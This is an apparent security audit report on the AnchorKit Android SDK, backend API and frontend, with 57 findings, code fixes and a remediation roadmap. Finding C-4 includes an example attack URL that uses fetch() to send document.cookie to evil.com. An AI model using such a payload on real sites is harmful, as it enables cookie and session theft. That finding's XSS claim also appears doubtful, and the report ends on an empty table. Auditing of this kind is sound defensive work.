# AnchorKit Security Review
**Date:** 2026-03-09
**Scope:** Full codebase across `NEWO-J/AnchorKit` (Android SDK), `NEWO-J/AnchorKit_API` (Backend), `NEWO-J/anchorkit.net` (Frontend)
**Methodology:** Source-level static analysis — component interaction tracing, data-flow reasoning, cryptographic correctness verification

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Findings](#critical-findings)
3. [High Severity](#high-severity)
4. [Medium Severity](#medium-severity)
5. [Low Severity](#low-severity)
6. [Cross-Component Issues](#cross-component-issues)
7. [Remediation Roadmap](#remediation-roadmap)

---

## Executive Summary

AnchorKit is a proof-of-liveliness platform that chains together: a mobile SDK (Android/Kotlin) that captures hardware-attested photos/videos → a backend API (Python/Flask) that verifies attestations, hashes content, and anchors Merkle roots to Solana → a frontend dashboard (React/TypeScript) for user management and proof verification.

**Total issues found: 57**

| Severity | Count |
|----------|-------|
| CRITICAL | 7 |
| HIGH | 15 |
| MEDIUM | 22 |
| LOW | 13 |

The most dangerous issues are:
- A completely broken Solana PDA derivation algorithm that undermines all on-chain verification
- DOM-based XSS in the frontend 404 redirect handler
- JWT tokens stored in `localStorage` (XSS-accessible)
- A TOCTOU race condition in email-change allowing duplicate account takeover
- A Solana keypair loaded from a potentially world-readable file without permission checks

---

## Critical Findings

---

### C-1 · Solana PDA Derivation Algorithm Is Wrong
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 171–186 (`findProgramAddress`)
**Severity:** CRITICAL

**Description:**
The SHA-256 digest update order for deriving a Program Derived Address (PDA) is incorrect. The current code updates the `"ProgramDerivedAddress"` marker **first**, then seeds, bump, and programId. Solana's specification requires the order:

```
SHA256( seeds... || bump || programId || "ProgramDerivedAddress" )
```

**Current (wrong):**
```kotlin
digest.update("ProgramDerivedAddress".toByteArray())
for (seed in seeds) digest.update(seed)
digest.update(byteArrayOf(bump.toByte()))
digest.update(programId)
```

**Impact:**
Every locally computed PDA will be wrong. Legitimate proofs will fail local verification, and this flawed derivation could accept forged proofs that happen to collide with the wrong hash ordering.

**Fix:**
```kotlin
for (seed in seeds) digest.update(seed)
digest.update(byteArrayOf(bump.toByte()))
digest.update(programId)
digest.update("ProgramDerivedAddress".toByteArray())
```

---

### C-2 · Missing Fields Break Proof Serialization at Runtime
**Repo:** `AnchorKit` (Android SDK)
**File:** `demo-app/src/main/java/io/anchorkit/demo/MainActivity.kt`
**Lines:** 239–261 (`portableProofToJson`)
**Severity:** CRITICAL

**Description:**
`portableProofToJson()` references `proof.solana_registry_pda` and `proof.merkle_root`, but neither field exists in the `PortableProof` data class. This is a compile-time/runtime error that causes the "Download Proof" feature to crash entirely.

**Impact:**
Users cannot export their proofs. Any integration that attempts to use the download feature will crash.

**Fix:** Add `solana_registry_pda: String?` and `merkle_root: String?` to `PortableProof`, or remove the references and reconstruct those values on-the-fly from existing fields.

---

### C-3 · Ed25519 Curve Check Uses Incorrect Constant / Suspect Byte Ordering
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 197–217 (`isOnEd25519Curve`)
**Severity:** CRITICAL

**Description:**
The Ed25519 point-on-curve check is implemented using raw `BigInteger` arithmetic with a manual byte-array `reverse()`. The little-endian coordinate handling is suspicious — if bytes are reversed in the wrong direction, valid points will be rejected and invalid points may be accepted. This is a custom cryptographic implementation in application code, which is high-risk.

**Impact:**
PDA validity checks could silently pass for invalid keys or reject valid ones, undermining the entire verification chain.

**Fix:** Replace with a vetted Ed25519 library (Google Tink, Conscrypt, or BouncyCastle) rather than implementing curve arithmetic in application code.

---

### C-4 · DOM-Based XSS / Open Redirect in 404 Handler
**Repo:** `anchorkit.net` (Frontend)
**File:** `index.html`
**Lines:** 72–79
**Severity:** CRITICAL

**Description:**
The SPA 404 redirect restoration script decodes URL parameters and injects them directly into `window.history.replaceState()` without validation:

```html
<script>
  (function () {
    var params = new URLSearchParams(window.location.search);
    var p = params.get('p');
    if (p) {
      var h = params.get('h') || '';
      window.history.replaceState(null, '', decodeURIComponent(p) + decodeURIComponent(h));
    }
  })();
</script>
```

Attack URL example:
```
https://anchorkit.net/404.html?p=javascript:fetch('https://evil.com/?c='+document.cookie)&h=
```

**Impact:**
Full DOM-based XSS. An attacker can steal cookies, localStorage tokens (including the JWT), and perform account takeover. Also enables open redirect to phishing pages.

**Fix:**
```javascript
function isValidPath(path) {
  try {
    const decoded = decodeURIComponent(path);
    if (/^(javascript|data|vbscript):/i.test(decoded) || decoded.startsWith('//')) return false;
    return /^\/[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=%]*$/.test(decoded);
  } catch (e) { return false; }
}
var p = params.get('p');
if (p && isValidPath(p)) {
  var h = params.get('h') || '';
  window.history.replaceState(null, '', decodeURIComponent(p) + (isValidPath(h) ? decodeURIComponent(h) : ''));
}
```

---

### C-5 · JWT Stored in `localStorage` — Fully Accessible to XSS
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/LoginPage.tsx`
**Lines:** 34–35 (also `DashboardPage.tsx:62-63`, `App.tsx:93-94`)
**Severity:** CRITICAL

**Description:**
```tsx
localStorage.setItem('ak_token', data.token);
localStorage.setItem('ak_email', data.email);
```

`localStorage` is accessible to all JavaScript on the page, including third-party scripts and any XSS payload. Combined with C-4 above, an attacker can steal the JWT in one request.

**Impact:**
Complete account takeover. Any XSS on the domain is escalated to full session compromise.

**Fix (in priority order):**
1. **Best:** Move to `HttpOnly; Secure; SameSite=Strict` cookies (requires backend changes)
2. **Good:** In-memory token store (lost on page refresh, use refresh tokens in `sessionStorage`)
3. **Minimum:** Move to `sessionStorage` to limit exposure to the tab lifetime

---

### C-6 · TOCTOU Race Condition in Email Change
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/dashboard.py`
**Lines:** 185–206 (also `src/storage/users.py:115–156`)
**Severity:** CRITICAL

**Description:**
The email-change flow performs a `get_user(new_email)` uniqueness check, then separately calls `set_pending_email()`. These are two non-atomic DynamoDB operations. Two concurrent requests for the same email can both pass the uniqueness check.

**Impact:**
Two users could end up with the same email address in `pending_email`. If either confirms, their account converges on the same email. This could allow one user to hijack another's email verification flow.

**Fix:**
Use DynamoDB conditional write (`ConditionExpression=Attr('email').not_exists() & Attr('pending_email').not_exists()`) in `set_pending_email()` to make the uniqueness check and the write atomic.

---

### C-7 · Solana Keypair Loaded from Potentially World-Readable File
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/blockchain/solana_client.py`
**Line:** 54
**Severity:** CRITICAL

**Description:**
```python
keypair_path = os.environ.get("SOLANA_KEYPAIR_PATH", "~/.config/solana/id.json")
with open(keypair_path) as f:
    secret = json.load(f)
```

No permission check is performed before loading. If the file has world-readable permissions (default `0644` on many systems), any process on the host can read the private key. Additionally, storing a private key in a flat file in a containerized environment risks it being baked into Docker image layers.

**Impact:**
Full compromise of the on-chain Merkle root posting keypair. An attacker with keypair access can post arbitrary Merkle roots, fabricating proof anchors.

**Fix:**
```python
import stat
path = os.path.expanduser(keypair_path)
file_stat = os.stat(path)
if file_stat.st_mode & (stat.S_IRGRP | stat.S_IROTH):
    raise RuntimeError(f"Keypair file {path} has insecure permissions. Run: chmod 600 {path}")
```
Longer term: store in AWS Secrets Manager or HashiCorp Vault.

---

## High Severity

---

### H-1 · API Key Duplicated in Request Body AND Header
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKitClient.kt`
**Lines:** 177, 234, 259
**Severity:** HIGH

**Description:**
The API key is sent both in the `X-API-Key` header and in the JSON request body. Request bodies are more likely to be logged by reverse proxies, WAFs, and application-layer middleware.

**Fix:** Remove `api_key` from all JSON request bodies. Headers only.

---

### H-2 · Certificate Pinning Bypassed for Non-Production Hosts
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKitClient.kt`
**Lines:** 309–311
**Severity:** HIGH

**Description:**
Certificate pinning is only enforced for `api.anchorkit.net`. Custom `baseUrl` values (staging, dev) bypass pinning entirely and rely on the system trust store. An attacker on the same network as a developer can intercept all staging traffic with a self-signed cert added to the system store.

**Fix:** Enforce pinning for all HTTPS connections, or document explicitly that custom hosts must only be used on isolated networks.

---

### H-3 · Attestation Challenge (Nonce) Reused Indefinitely
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/EnclaveAttestation.kt`
**Lines:** 231–243
**Severity:** HIGH

**Description:**
`getOrCreateChallenge()` generates a UUID challenge once, stores it in `SharedPreferences`, and reuses it for every subsequent attestation until the app is uninstalled. A replay attack using a previously recorded attestation would use the same challenge.

**Fix:** Generate a fresh cryptographic random challenge for each attestation operation. Do not persist the challenge.

---

### H-4 · Client-Controlled Timestamp in SubmitRequest
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/models/SubmitRequest.kt`
**Line:** 12
**Severity:** HIGH

**Description:**
```kotlin
val timestamp: Long = System.currentTimeMillis()
```
The timestamp is set on the device. An attacker with device clock control (trivial on Android without root via developer options) can make submissions appear to occur at arbitrary times.

**Impact:** Destroys the temporal integrity of proof-of-liveliness attestations.

**Fix:** Remove `timestamp` from `SubmitRequest`. Use only the server-recorded timestamp in `VerificationReceipt`.

---

### H-5 · Rate Limiter Fails Open on DynamoDB Error
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/storage/rate_limiter.py`
**Lines:** 119–165
**Severity:** HIGH

**Description:**
If DynamoDB is unavailable, the rate limiter falls back to an in-process cache. During a multi-process restart (e.g., blue/green deployment), each process starts with an empty cache and enforces limits independently. N processes = N×limit effective rate.

**Fix:** Fail closed — return HTTP 503 when DynamoDB is unavailable rather than falling through to an in-process limit.

---

### H-6 · JWT Lifetime Is 24 Hours With No Revocation
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/auth.py`
**Line:** 40
**Severity:** HIGH

**Description:**
`_JWT_EXPIRY = 24 * 3600`. No refresh token mechanism, no revocation endpoint. A stolen JWT grants access to all account operations (key regeneration, email change, deletion) for a full day.

**Fix:** Reduce to 1 hour. Implement short-lived access tokens + long-lived refresh tokens stored server-side (enabling revocation on logout).

---

### H-7 · X-Forwarded-For Spoofing Bypasses Rate Limiting
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/storage/utils.py`
**Lines:** 38–57
**Severity:** HIGH

**Description:**
When `ANCHORKIT_TRUST_PROXY=true`, the real client IP is taken from `X-Forwarded-For`. If the API is deployed directly internet-facing (no load balancer), any client can spoof their IP and bypass per-IP rate limits.

**Fix:** Document that `TRUST_PROXY` requires a trusted reverse proxy in front. Consider restricting to a configurable CIDR of allowed proxy IPs rather than a boolean flag.

---

### H-8 · Legacy Shared API Key Has No Per-User Rate Limiting
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/hash_submission.py`
**Lines:** 25–33
**Severity:** HIGH

**Description:**
The `ANCHORKIT_API_KEY` environment-variable key is accepted for hash submission but is not scoped to any user, making per-user rate limiting ineffective. Anyone who obtains it can submit unlimited hashes with no accountability.

**Fix:** Remove the shared key from production paths. If a demo key is needed, apply the most restrictive rate limits to it and log all usage.

---

### H-9 · Missing CSRF Protection on State-Changing Dashboard Requests
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/DashboardPage.tsx`
**Lines:** 81, 104, 127, 156, 181
**Severity:** HIGH

**Description:**
POST/PATCH/DELETE requests for API key regeneration, account deletion, and email change carry only a `Bearer` token — no CSRF token. If `localStorage`-based auth is replaced with cookies (the recommended fix for C-5), all these endpoints become CSRF-vulnerable.

**Fix:** Add `X-CSRF-Token` headers backed by server-issued tokens, or ensure cookies use `SameSite=Strict` if cookie-based auth is adopted.

---

### H-10 · Sensitive Reset Token Exposed in URL and Referer Header
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/ResetPasswordPage.tsx`
**Lines:** 11–13
**Severity:** HIGH

**Description:**
```tsx
const email = searchParams.get('email') ?? '';
const token = searchParams.get('token') ?? '';
```
Password reset tokens in URL query parameters are logged in server access logs, appear in browser history, and are sent in `Referer` headers if the user clicks any external link before using the token.

**Fix:** Use URL hash fragments (`#token=...`) which are not sent to the server, or POST the token from the email link to a server-side endpoint that converts it to a short-lived session cookie.

---

### H-11 · Attestation Strict Mode Can Be Disabled — Accepts Non-Hardware Proofs
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/attestation/keystore_attestation.py`
**Lines:** 293–323
**Severity:** HIGH

**Description:**
`ATTESTATION_STRICT_MODE=false` allows submissions without the Android Keystore attestation extension. This entirely defeats the hardware-rooted trust model — photos from any device are accepted without attestation.

**Fix:** Remove the strict-mode bypass from the production code path. If a development path is needed, return a clearly marked `non_production: true` flag in the response and prevent anchoring to mainnet.

---

### H-12 · Solana Chunk Index Silently Truncates at 65535
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 155–158
**Severity:** HIGH

**Description:**
```kotlin
val chunkIndexBytes = byteArrayOf(
    (chunkIndex and 0xFF).toByte(),
    ((chunkIndex shr 8) and 0xFF).toByte()
)
```
If `solana_chunk_index > 65535`, the value is silently truncated. The wrong PDA is derived, and all proofs with high chunk indices fail local verification silently.

**Fix:** `require(chunkIndex in 0..65535) { "Chunk index out of range: $chunkIndex" }`

---

### H-13 · Nonce Consumption Not Logged for Security Alerting
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/attestation/nonce_store.py`
**Lines:** 124–173
**Severity:** HIGH

**Description:**
Nonce reuse attempts are not logged. An attacker probing the system by replaying attestation nonces leaves no audit trail.

**Fix:** Log all nonce reuse attempts with the client IP, timestamp, and nonce value. Alert on > N reuse attempts per IP per hour.

---

### H-14 · Merkle Proof Depth Not Validated — DoS Vector
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 235–247
**Severity:** HIGH

**Description:**
The `computeMerkleRoot()` function iterates over a proof list with no maximum depth check. A malicious `PortableProof` with millions of steps would compute indefinitely, freezing the app.

**Fix:**
```kotlin
require(merkleProof.size <= 64) { "Merkle proof depth exceeds maximum: ${merkleProof.size}" }
```

---

### H-15 · Solana RPC Endpoint Hardcoded With No Fallback
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 51–55
**Severity:** HIGH

**Description:**
A single hardcoded RPC endpoint per network with no fallback. If the RPC is down, local proof verification is impossible with no user-visible explanation.

**Fix:** Accept a list of RPC endpoints and try them in order. Surface a clear "RPC unavailable" error rather than a generic failure.

---

## Medium Severity

---

### M-1 · Attestation Challenge Stored in Unencrypted SharedPreferences
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/EnclaveAttestation.kt`
**Lines:** 135, 232, 238

Sensitive attestation data is stored in plaintext `SharedPreferences`. On a rooted device, the challenge can be read by any privileged process.

**Fix:** Use `EncryptedSharedPreferences` (Jetpack Security library).

---

### M-2 · Merkle Proof Step Content Not Validated
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Lines:** 235–247

Steps are checked for `size != 2` but the sibling hash is not validated as valid hex, and position is not validated as exactly `"left"` or `"right"`. Malformed proofs silently return `null`.

**Fix:** `require(step[0].matches(Regex("[0-9a-f]{64}")))` and `require(step[1] in listOf("left", "right"))`.

---

### M-3 · Nonce Expiry Not Checked Client-Side Before Use
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKit.kt`
**Lines:** 60, 142, 214

The `expires_at` field on `AttestationChallenge` is never read. On slow connections, the nonce may expire between fetch and use, causing an opaque server-side rejection.

**Fix:**
```kotlin
if (System.currentTimeMillis() > challenge.expires_at * 1000L) {
    throw AnchorKitError.ChallengeExpired
}
```

---

### M-4 · Incomplete Metadata Key Validation
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/hash_submission.py`
**Lines:** 84–136

Metadata keys are checked for length but not character set. Keys containing newlines, control characters, or Unicode could cause injection issues in downstream logs, email alerts, or UI rendering.

**Fix:** Validate keys against `^[a-zA-Z0-9_-]+$`.

---

### M-5 · Email Validation Regex Allows Invalid Addresses
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/auth.py`
**Line:** 37

`^[^@\s]+@[^@\s]+\.[^@\s]+$` accepts `@example.com`, `user@@example.com`, and arbitrarily long strings.

**Fix:** Use `email-validator` library and add a 255-character length cap.

---

### M-6 · DER Parser Does Not Validate Constructed/Primitive Tag Flags
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/attestation/keystore_attestation.py`
**Lines:** 68–148

Fields marked as constructed when they should be primitive (or vice versa) are not rejected. A crafted certificate with mismatched tags could produce incorrect parsed values that still pass validation.

**Fix:** Assert expected `constructed` flag for each known tag position. Consider using the `cryptography` library's built-in extension parser instead.

---

### M-7 · Merkle Root Posting to Solana Is Not Idempotent
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/blockchain/solana_client.py`
**Lines:** 361–442

If the nightly job crashes after Solana submission but before writing the tx signature to DynamoDB, the next run posts the same root again under a different transaction, creating duplicate on-chain anchors.

**Fix:** Write a "pending anchor" record to DynamoDB *before* posting to Solana. Update it to "confirmed" after success. On restart, check for pending records and resume from those.

---

### M-8 · No Content-Security-Policy Header on Frontend
**Repo:** `anchorkit.net` (Frontend)
**File:** All pages

No CSP is configured. Any successful XSS can exfiltrate data to arbitrary external hosts.

**Fix:**
```
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.anchorkit.net; frame-ancestors 'none'; upgrade-insecure-requests;
```

---

### M-9 · Missing Security Headers (HSTS, X-Frame-Options, etc.)
**Repo:** `anchorkit.net` (Frontend)
**File:** Server/CDN configuration

Missing: `Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`.

**Fix:** Add all four headers at the CDN/server layer.

---

### M-10 · Password Reset Token in URL Sent in Referrer Header
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/ResetPasswordPage.tsx`
**Lines:** 11–13

(See H-10 for full details. Duplicated here for tracking as it has both frontend and backend surface.)

---

### M-11 · Dummy bcrypt Hash Format May Not Guarantee Constant-Time Path
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/auth.py`
**Line:** 374

The dummy hash used for unknown-user logins (`$2b$12$invalidhashpadding...`) may not be a valid bcrypt format. If `bcrypt.checkpw()` throws for invalid format, the exception path timing differs from the valid-hash path, leaking email existence.

**Fix:** Use a pre-computed bcrypt hash of a random string as the dummy.

---

### M-12 · CSRF Risk on HTML Form Endpoints
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/auth.py`, `src/api/routes/dashboard.py`

HTML-based endpoints (email verification, unsubscribe) are not CSRF-protected. If the site ever uses cookies for auth, these become CSRF-exploitable.

**Fix:** Add CSRF tokens to all HTML forms.

---

### M-13 · Sensitive Data (Metadata, Attestation Certs) Not Explicitly Encrypted at Rest
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/storage/hot_storage.py`, `src/storage/warm_storage.py`

No explicit encryption-at-rest configuration is asserted in the code. If AWS defaults are not configured, data is stored in plaintext.

**Fix:** Assert DynamoDB and S3 encryption-at-rest in infrastructure-as-code and at startup.

---

### M-14 · No Required Environment Variable Validation at Startup
**Repo:** `AnchorKit_API` (Backend)
**File:** Application entry point

Critical security configuration (`ANCHORKIT_SECRET_KEY`, `ATTESTATION_STRICT_MODE`, Solana keypair path, AWS credentials) has no centralized validation. Missing variables fail silently or cause cryptic errors at runtime.

**Fix:** Add a config validator that checks all required env vars at startup and exits with a clear message.

---

### M-15 · Detailed API Error Messages Enable User Enumeration
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/LoginPage.tsx`
**Line:** 38 and others

Backend error detail strings are displayed directly in the UI. If the backend returns different messages for "user not found" vs "wrong password", this enables user enumeration.

**Fix:** Map server error codes to generic user-facing messages client-side.

---

### M-16 · Photo Dimensions Can Be (0,0) Without Error
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/PhotoCapture.kt`
**Lines:** 125–145

`extractDimensions()` returns `Pair(0, 0)` on failure, which is included in the metadata hash. Nonsensical dimensions in a proof could undermine metadata integrity claims.

**Fix:** Return a `Result.failure()` if dimensions cannot be extracted; surface the error to the caller.

---

### M-17 · No Explicit TLS Version Enforcement
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKitClient.kt`
**Lines:** 122–124

`SSLContext.getInstance("TLS")` may negotiate TLS 1.0/1.1 on older Android versions.

**Fix:** Use `SSLContext.getInstance("TLSv1.3")` or set `TLSv1.2` as the minimum via `SSLParameters`.

---

### M-18 · `ignoreUnknownKeys = true` Hides API Schema Drift
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKitClient.kt`
**Line:** 33

New server response fields are silently discarded. Security-relevant new fields (e.g., a `requires_reauth` flag) would be ignored without any log or warning.

**Fix:** Either remove `ignoreUnknownKeys` or log when unknown keys are encountered.

---

### M-19 · No Camera Operation Timeout
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/PhotoCapture.kt`
**Lines:** 46–116

`capturePhoto()` has no timeout. A hung camera holds the coroutine indefinitely, making the UI unresponsive.

**Fix:** Wrap in `withTimeoutOrNull(10_000L)` and surface a `CameraTimeoutError`.

---

### M-20 · RPC Base64 Decode Exception Not Caught
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/SolanaVerifier.kt`
**Line:** 289

`Base64.decode()` on malformed RPC data throws `IllegalArgumentException` that propagates as a generic verification failure with no context.

**Fix:** Wrap in `try/catch` and return `LocalVerificationResult(valid=false, reason="Invalid RPC response encoding")`.

---

### M-21 · Network Parameter Typo Resets Solana Chunk Index
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/blockchain/solana_client.py`
**Lines:** 76–107

Chunk index is partitioned by network name string. A capitalization change (`devnet` → `Devnet`) silently resets the counter, causing duplicate on-chain PDA addresses.

**Fix:** Validate `network` against an enum before use.

---

### M-22 · Admin Alert Emails Include Unescaped User-Controlled Email Strings
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/dashboard.py`
**Lines:** 131, 209

`f"User: {user['email']}\n"` — if email validation is ever weakened, an email containing newlines could inject new headers or body lines into outbound admin emails.

**Fix:** Sanitize the email value before including in alert email body.

---

## Low Severity

---

### L-1 · Video Temp File Not Securely Wiped Before Deletion
**Repo:** `AnchorKit` (Android SDK)
**File:** `demo-app/src/main/java/io/anchorkit/demo/CameraActivity.kt`
**Line:** 515

`file.delete()` does not zero the file contents. On journaling filesystems, bytes may be recoverable.

**Fix:** Overwrite with random bytes before deleting, or use Android's `SecureDeleteFile` helper if available.

---

### L-2 · Demo App Does Not Validate BuildConfig Fields at Startup
**Repo:** `AnchorKit` (Android SDK)
**File:** `demo-app/src/main/java/io/anchorkit/demo/MainActivity.kt`
**Lines:** 84–89

`BuildConfig.ANCHORKIT_API_KEY` is used without checking for empty string. Silent failure with unhelpful errors.

**Fix:**
```kotlin
check(BuildConfig.ANCHORKIT_API_KEY.isNotEmpty()) { "ANCHORKIT_API_KEY not configured" }
```

---

### L-3 · Test Date Override Not Prominently Logged
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/storage/utils.py`
**Lines:** 10–21

`ANCHORKIT_TEST_DATE` silently overrides all date logic. This can cause confusing data in tests.

**Fix:** Log a prominent `WARNING: Using test date override: {date}` at startup.

---

### L-4 · Certificate Fingerprints in API Responses Are Unique Identifiers
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/hash_submission.py`
**Lines:** 158–167

Hardware certificate fingerprints uniquely identify physical devices. These are returned in `SubmitResponse` and stored in DynamoDB.

**Note:** Not a direct vulnerability, but a privacy consideration. Users should be aware their device is uniquely identified per submission.

---

### L-5 · Hash Normalization Happens After Validation (Ordering Confusion)
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/hash_submission.py`
**Line:** 75

Validation accepts both upper and lowercase, then normalization lowercases. Order is correct but undocumented, making future refactors fragile.

**Fix:** Add a comment explaining the intentional ordering.

---

### L-6 · Markdown Links Not Validated in Docs Renderer
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/DocsPage.tsx`
**Lines:** 92–94

If docs content is ever editable or loaded from an untrusted source, `javascript:` or `data:` URIs in links would execute.

**Fix:** Validate `href` against an allowlist of safe protocols (`http:`, `https:`, `/`, `#`) before rendering.

---

### L-7 · Open Redirect Risk in `window.open()` Calls If URLs Become Dynamic
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/app/App.tsx`
**Lines:** 83, 350

Currently hardcoded GitHub URLs. If these become configurable, they become open redirect vectors.

**Fix:** Maintain an allowlist of permitted external URLs.

---

### L-8 · No Rate Limiting on Client-Side API Calls
**Repo:** `AnchorKit` (Android SDK)
**File:** `anchorkit-android-sdk/src/main/java/io/anchorkit/sdk/AnchorKitClient.kt`

No client-side throttle. An attacker who obtains the SDK could hammer the verify or download endpoints.

**Fix:** Implement exponential back-off and a token-bucket limiter in the SDK.

---

### L-9 · API Parameter Injection Risk in VerifyPage
**Repo:** `anchorkit.net` (Frontend)
**File:** `src/pages/VerifyPage.tsx`
**Line:** 42

Hash is interpolated directly into URL path. Validation is present but a regex change could introduce path traversal.

**Fix:** Use `encodeURIComponent(hash)` in the URL construction regardless of prior validation.

---

### L-10 · `json.ignoreUnknownKeys` Masks Security-Relevant Server Fields (duplicate note)
See M-18.

---

### L-11 · No 2FA on Account Operations
**Repo:** `AnchorKit_API` / `anchorkit.net`

High-value operations (API key regeneration, account deletion, email change) have no secondary authentication challenge.

**Fix (future):** Add TOTP 2FA for sensitive account operations.

---

### L-12 · No Logout / Token Revocation Endpoint
**Repo:** `AnchorKit_API` (Backend)
**File:** `src/api/routes/auth.py`

There is no logout endpoint. JWTs cannot be revoked before their 24-hour expiry.

**Fix:** Implement a blocklist (Redis/DynamoDB) for revoked JWTs, checked on every authenticated request.

---

### L-13 · No Subresource Integrity on External Resources
**Repo:** `anchorkit.net` (Frontend)

If any third-party CDN scripts are added in the future, absent SRI hashes would allow CDN compromise to serve malicious JavaScript.

**Fix:** Add `integrity` attributes to all `<script src="...">` and `<link rel="stylesheet" href="...">` tags pointing to external URLs.

---

## Cross-Component Issues

These issues span multiple repos and represent end-to-end trust breaks:

### X-1 · Broken Verification Chain: Wrong PDA + Missing Fields + No Client Expiry Check
C-1 (wrong PDA derivation) + C-2 (missing PortableProof fields) + M-3 (no nonce expiry check) together mean the entire local proof verification pipeline is non-functional. Users get either crashes or false "unverified" results.

### X-2 · Token Storage Mismatch Between Frontend and Backend
The frontend stores JWTs in `localStorage` (C-5) while the backend issues 24-hour tokens with no revocation (H-6). Combined with the XSS in C-4, a single reflected XSS completely compromises a user session for up to 24 hours with no ability to invalidate it.

### X-3 · Client Timestamp + Server Acceptance = Forged Proof Timeline
The Android SDK sends a client-controlled `timestamp` (H-4) and the server accepts it without server-side overwrite (confirmed by `SubmitRequest` model — no server-side timestamp override visible). This means an attacker can create backdated or future-dated proofs that are anchored to Solana, fabricating a timeline of activity.

### X-4 · Attestation Strict Mode Off + Forged Client Timestamp = Complete Proof Forgery
`ATTESTATION_STRICT_MODE=false` (H-11) + client timestamp (H-4) + broken PDA derivation (C-1) means that in a non-strict deployment, anyone can submit an arbitrary photo with an arbitrary timestamp, anchor it to Solana, and generate a "proof" that passes all current validation.

---

## Remediation Roadmap

### Phase 1 — Immediate (Before Any Production Traffic)

| # | Issue | Effort |
|---|-------|--------|
| C-1 | Fix PDA derivation byte order in `SolanaVerifier.kt` | 30 min |
| C-2 | Fix missing PortableProof fields | 1 hr |
| C-3 | Replace custom Ed25519 with Tink/BouncyCastle | 4 hrs |
| C-4 | Sanitize URL parameters in 404 redirect script | 1 hr |
| C-5 | Move JWT to HttpOnly cookie (requires backend + frontend) | 1 day |
| C-6 | Fix TOCTOU in email change with DynamoDB conditional write | 2 hrs |
| C-7 | Add keypair file permission check; document Secrets Manager path | 2 hrs |
| H-4 | Remove client timestamp from SubmitRequest | 1 hr |
| H-11 | Remove `ATTESTATION_STRICT_MODE` bypass from production | 2 hrs |

### Phase 2 — High Priority (Within 1 Week)

| # | Issue | Effort |
|---|-------|--------|
| H-1 | Remove API key from request body | 1 hr |
| H-3 | Generate fresh attestation challenge per attestation | 2 hrs |
| H-5 | Rate limiter fail-closed on DynamoDB error | 2 hrs |
| H-6 | Reduce JWT lifetime; add refresh tokens + revocation | 1 day |
| H-9 | Add CSRF tokens to dashboard operations | 4 hrs |
| H-10 | Move reset token to POST body or URL fragment | 2 hrs |
| H-12 | Validate chunk index range | 30 min |
| H-14 | Add Merkle proof depth cap | 30 min |
| M-4 | Metadata key character validation | 1 hr |
| M-8 | Add Content-Security-Policy header | 2 hrs |
| M-9 | Add HSTS, X-Frame-Options, X-Content-Type-Options | 1 hr |

### Phase 3 — Planned (Within 1 Month)

| # | Issue | Effort |
|---|-------|--------|
